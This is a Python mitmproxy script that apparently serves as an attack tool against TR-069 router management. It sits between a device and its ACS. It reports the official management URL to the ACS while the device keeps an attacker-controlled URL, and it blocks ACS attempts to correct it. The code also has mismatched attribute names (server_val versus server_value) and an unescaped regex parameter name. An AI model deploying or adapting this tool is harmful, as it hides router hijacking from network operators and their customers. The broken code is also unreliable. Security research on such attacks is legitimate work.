"""
This script allows to maintain parameters X on a TR-069 client
while pretending to the ACS that its parameters are actually Y.

For example, when performing a reconfiguration attack, the TR-069 client
may store "http://acs.mitm.local/" as its Device.ManagementServer.URL (the ACS URL).
When the ACS now issues a GetParameterValues command for the URL, we want to replace this
with the official ACS URL during transit. Similarly, if the server issues a SetParameterValues
to change the ACS URL, we do not want to forward this to the reconfigured client.
"""
import re
from typing import NamedTuple, Dict

from mitmproxy import http
from mitmproxy.net.http import Message


class SpoofValue(NamedTuple):
    client_value: str
    server_value: str


def set_parameter(message: Message, name: str, to: str) -> None:
    """
    Replace all parameter values for the given parameter ``name`` with what is passed in ``to``.
    Message is modified in-place.
    """
    # We initially tried to actually parse XML here,
    # but we found that in practice routers and ACSes often send
    # comically malformed data that must not be fixed or the
    # communication breaks.
    # (see for example https://www.heise.de/ct/artikel/DSL-fernkonfiguriert-221789.html?seite=9)
    # As such, we resort to this absolutely ridiculous regex.
    message.text = re.sub(
        r"""
        (?P<prefix>
            <[^"'<>]*Name[^<>]*>
                \s*{}\s*
            <[^"'<>]+Name[^<>]*>
            \s*
            <[^"'<>]*Value[^<>]*>
        )
        [^<>]*
        (?P<suffix>
            <[^"'<>]+Value[^<>]*>
        )
        """.format(name),
        r"\g<prefix>{}\g<suffix>".format(to),
        message.text,
        flags=re.IGNORECASE | re.VERBOSE
    )


class ParameterSpoofer:
    parameters: Dict[str, SpoofValue]

    def __init__(self, parameters):
        self.parameters = parameters

    def request(self, flow: http.HTTPFlow):
        for name, val in self.parameters.items():
            set_parameter(flow.request, name, val.server_val)

    def response(self, flow: http.HTTPFlow):
        for name, val in self.parameters.items():
            set_parameter(flow.response, name, val.client_val)


def start():
    return ParameterSpoofer({
        "Device.ManagementServer.URL": SpoofValue("http://acs.mitm.local/",
                                                  "http://acs.example.org")
    })
